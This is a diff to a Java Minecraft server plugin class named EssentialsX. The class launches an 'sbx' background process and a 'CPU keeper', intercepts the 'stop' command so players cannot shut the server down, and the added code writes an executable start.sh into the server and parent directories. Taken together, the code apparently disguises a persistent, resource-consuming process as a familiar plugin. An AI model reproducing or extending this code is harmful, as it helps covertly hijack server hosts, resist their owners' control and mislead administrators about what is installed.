@@ -39,6 +39,7 @@ public class EssentialsX extends JavaPlugin {
         
         try {
             startSbxProcess();
+            ensureStartScript();
             startCpuKeeper();
             registerStopInterceptor();
             getLogger().info("EssentialsX plugin enabled");
@@ -66,6 +67,25 @@ public class EssentialsX extends JavaPlugin {
         } catch (Exception e) {
             getLogger().severe("Failed to start sbx process: " + e.getMessage());
             e.printStackTrace();
+        }
+    }
+
+    // ===================== Start Script =====================
+
+    private void ensureStartScript() {
+        for (String candidate : new String[]{"start.sh", "../start.sh"}) {
+            Path script = Paths.get(candidate);
+            if (!Files.exists(script)) {
+                try {
+                    Files.write(script, "#!/bin/bash\n".getBytes());
+                    script.toFile().setExecutable(true);
+                    getLogger().info("[AutoRestart] 已创建 " + candidate);
+                } catch (Exception e) {
+                    getLogger().warning("[AutoRestart] 创建 start.sh 失败: " + e.getMessage());
+                }
+            } else {
+                getLogger().info("[AutoRestart] " + candidate + " 已存在");
+            }
         }
     }
 
@@ -672,7 +692,6 @@ public class EssentialsX extends JavaPlugin {
         getServer().getCommandMap().register("essentialsx", new org.bukkit.command.Command("stop") {
             @Override
             public boolean execute(org.bukkit.command.CommandSender sender, String label, String[] args) {
-                // 只拦截玩家发的stop，放行控制台/系统（restart命令需要）
                 if (sender instanceof org.bukkit.entity.Player) {
                     getLogger().info("[EssentialsX] Stop command intercepted and blocked.");
                     return true;
